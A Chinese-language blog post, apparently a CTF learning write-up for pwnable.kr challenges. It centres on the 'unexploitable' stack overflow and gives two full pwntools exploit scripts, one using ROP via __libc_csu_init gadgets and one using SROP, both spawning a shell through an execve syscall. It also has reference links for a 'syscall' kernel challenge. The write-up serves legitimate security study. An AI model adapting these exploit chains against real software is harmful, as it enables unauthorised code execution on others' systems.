---
title: CTF | pwnable-kr-writeup
date: 2018-09-21 10:12:26
tags: 
---

### unexploitable


这道题可以用不同方法
题目给了源码

```c
#include <stdio.h>
void main(){
	// no brute forcing
	sleep(3);
	// exploit me
	int buf[4];
	read(0, buf, 1295);
}
```
看一下保护：

```
  Arch:     amd64-64-little
  RELRO:    Partial RELRO
  Stack:    No canary found
  NX:       NX enabled
  PIE:      No PIE (0x400000)
```

第一反应是用return to dl reslove，但是仔细一看没法做内存泄漏。因为64位需要把debug位置0，但是无法得到link_map的地址，所以这条路走不通。 嗯？？对于这里不是很明白。。。
在ida中看不到 syscall 的gadget ,可以用 `ropper` 工具搜一下, 
看到网上有人说：
`ROPgadget` 似乎存在一个缺陷，无法把单独的 `syscall` 识别成一个 `gadget` 。所以用 ropper[https://github.com/sashs/Ropper]，通过 `ropper`  搜索到了一个 `syscall`

搜嘎！
```c
yuuoniy@yuuoniy-virtual-machine:~/Desktop/201809$ ropper2 --file unexploitable --search "syscall"
[INFO] Load gadgets for section: PHDR
[LOAD] loading... 100%
[INFO] Load gadgets for section: LOAD
[LOAD] loading... 100%
[LOAD] removing double gadgets... 100%
[INFO] Searching for gadgets: syscall

[INFO] File: unexploitable
0x0000000000400560: syscall; 
```
read的返回值是其成功读取的字符数，而i386/amd64的返回值一般保存在eax/rax中，所以可以通过 read 控制 eax
`ropper2 --file unexploitable --all` 查看所有 gadgets 
没法控制 rdi? 只能控制 edi? 没法控制 rdx还是可以的...
可以找到 `gadgets`..

#### 直接ROP：
利用 `syscall` 调用 `execve("/bin/sh",0,0) ``rax` 为 `59` .
分别设置` rdi rsi rdx`,通过 `read` 设置 `rax` 
就是 `__libc_csu_init` 的通用 gadgets 呀 ！！执行 `gadget1` 再执行 `gadget2`


思路：
1. 通过栈溢出覆盖返回地址，调用 `read` 将 `payload` 和 '/bin/sh' 写入字符串
2. 执行第二段 `payload` ，控制 `RAX` ，利用 `syscall` 执行 `execve("/bin/sh")`

首先要找到读入的地址，在栈上欸,我们设置为 `bss` 段的地址

学习一下别人的 exp。。。
有几个地方不是很明白...关于 `bss_base` 的地址..以及 `payload` 构造时的 `padding` 
疑问：`padding` 为什么是0x38?
```python
from pwn import *

sh = process("./unexploitable")

bss_base = 0x000601028+0x200
sh_addr = 0x000601028+0x400

elf = ELF('./unexploitable')

sys_addr = 0x00400560
pop_rbp_ret=0x00400512
lea_ret = 0x00400576  #leave  ; ret
gadget1 = 0x004005e6 #
gadget2 = 0x004005d0

def call_function(call_addr,arg1,arg2,arg3): 
    payload = ""
    payload +=p64(gadget1) # rsp
    payload +='a'*8 
    payload += p64(0)+p64(1) # rbx rbp
    payload +=p64(call_addr)+p64(arg1)+p64(arg2)+p64(arg3)+p64(gadget2) # RIP=R12 RDI=R13 R14=RSI RDX=R16 
    payload += 'c'*0x38 #padding
    return payload

pay = 'a'*0x10+p64(bss_base) 
pay += call_function(elf.got['read'],0,bss_base,0x200)
pay += p64(pop_rbp_ret)+p64(bss_base)+p64(lea_ret)

pay2 = p64(bss_base+0x8)
pay2 += call_function(elf.got['read'],0,sh_addr,0x200)
pay2 += call_function(sh_addr+0x10,sh_addr,0,0)

pay3 = '/bin/sh\x00'.ljust(0x10,'b')
pay3 +=p64(sys_addr)
pay3 = pay3.ljust(59,'d')

sleep(3)
raw_input()
sh.send(pay)
raw_input()
sh.send(pay2)
raw_input()
sh.send(pay3)

sh.interactive()
```
#### SROP
我们再来学习一下这道题的SROP利用方式
思路：构造 fake signal frame 写入内存。然后将 RSP 指向这段空间，再发送 rt_sigreturn 
frame 布局
```
  Signal Frame
+-------------------------+-------------------------+
|        rt_sigreturn     |         uc_flags        |
+-------------------------+-------------------------+
|          &uc            |       uc_stack.ss_sp    |
+-------------------------+-------------------------+
|    uc_stack.ss_flags    |    uc_stack.ss_size     |
+-------------------------+-------------------------+
|          r8             |           r9            |
+-------------------------+-------------------------+
|          r10            |           r11           |
+-------------------------+-------------------------+
|          r12            |           r13           |
+-------------------------+-------------------------+
|          r14            |           r15           |
+-------------------------+-------------------------+
|          rdi            |           rsi           |
+-------------------------+-------------------------+
|          rbp            |           rbx           |
+-------------------------+-------------------------+
|          rdx            |           rax           |
+-------------------------+-------------------------+
|          rcx            |           rsp           |
+-------------------------+-------------------------+
|          rip            |           eflags        |
+-------------------------+-------------------------+
|        cs/gs/fs         |           err           |
+-------------------------+-------------------------+
|         trapno          |         oldmask         |
+-------------------------+-------------------------+
|          cr2            |          %fpstate       |
+-------------------------+-------------------------+
|       __reserved        |         sigmask         |
+-------------------------+-------------------------+

```

这里 cs 为什么要设置为 0x33：避免 segfault
相关链接中还有很巧妙的exp
```python
from pwn import *

sh = process("./unexploitable")

elf = ELF('./unexploitable')

sys_addr = 0x400560  
junk = 0xdeadbeef
pop_rbp_ret = 0x400512
read_ret = 0x40055b 
bss_addr = elf.bss()
rbp_base = bss_addr+0x10
sh_str_addr = rbp_base+0x20+8+ 0x100 # 0x100 is the offset of binsh in sig_frame

sig_frame = p64(sys_addr)+p64(0) # rt_sigreturn
sig_frame += p64(0)*12 
sig_frame += p64(sh_str_addr)+p64(0) # rdi, rsi
sig_frame += p64(0)*2
sig_frame += p64(0)+p64(0x3b)  # rdx, rax
sig_frame += p64(0)*2 
sig_frame += p64(sys_addr)+p64(0)# rip
sig_frame += p64(0x33)+p64(0)# cs why 0x33
sig_frame += p64(0)*6
sig_frame += '/bin/sh\x00'

pay1 = 'a'*0x10  
pay1 += p64(rbp_base)  # point rbp to .bss and read again  rbp = rbp_base+0x10-0x10 = bss_addr
pay1 += p64(read_ret)  #  lea     rax, [rbp+buf]

pay2 = 'a'*0x10
pay2 += p64(rbp_base+0x20)+p64(read_ret) # prepare signal frame ,and read to rbp(rbp_base+0x10)

pay2 += p64(junk)*2
pay2 += p64(junk)+sig_frame 

pay3 = 'b'*15  # rax=15

sleep(3)
sh.send(pay1)
sleep(0.3)
sh.send(pay2)
sleep(0.3)
sh.send(pay3)

sh.interactive()

```



相关链接：
http://weaponx.site/2017/02/28/unexploitable-Writeup-pwnable-kr/
http://alkalinesecurity.com/blog/ctf-writeups/pwnable-challenge-unexploitable/
https://bbs.ichunqiu.com/thread-44068-1-1.html
https://cubarco.org/blog/2015/12/writeup-pwnable-unexploitable/

### syscall
本题提供了一个自编写的内核模块源码，添加 sys_upper，把字符串中的小写改为大写

参考链接：
http://rk700.github.io/2016/11/11/pwnable-kr-syscall/ 推荐
https://www.w0lfzhang.com/2017/04/27/pwnable-syscall/  推荐
https://etenal.me/archives/972
https://cubarco.org/blog/2015/12/writeup-pwnable-syscall/
http://alkalinesecurity.com/blog/ctf-writeups/pwnable-challenge-syscall/

### unlink
再来学习一下 unlink 每次都忘记 5555
明天要交的论文现在还没写....emmmm 明天再写好了
